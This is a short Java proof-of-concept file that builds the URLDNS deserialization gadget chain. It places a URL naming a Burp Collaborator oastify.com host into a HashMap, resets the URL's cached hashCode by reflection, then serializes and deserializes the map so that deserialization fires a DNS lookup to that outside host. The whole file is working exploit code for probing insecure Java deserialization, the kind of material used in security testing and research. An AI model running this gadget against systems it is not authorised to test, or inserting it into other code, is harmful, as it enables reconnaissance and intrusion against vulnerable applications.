package exp;

import java.net.URL;
import java.util.HashMap;

import static tools.Decode.unserialize;
import static tools.Encode.serialize;
import static tools.SetField.setField;

public class URLDNS {
    public static void main(String[] args) throws Exception{
        HashMap<URL,Integer> hashMap = new HashMap<URL,Integer>();
        URL url = new URL("http://9t3238lmzktcmryrexuckpfmsdy4myan.oastify.com");
        setField(url,"hashCode",123456);
        hashMap.put(url,1);
        setField(url,"hashCode",-1);
        serialize(hashMap);
        unserialize("ser.bin");
    }
}
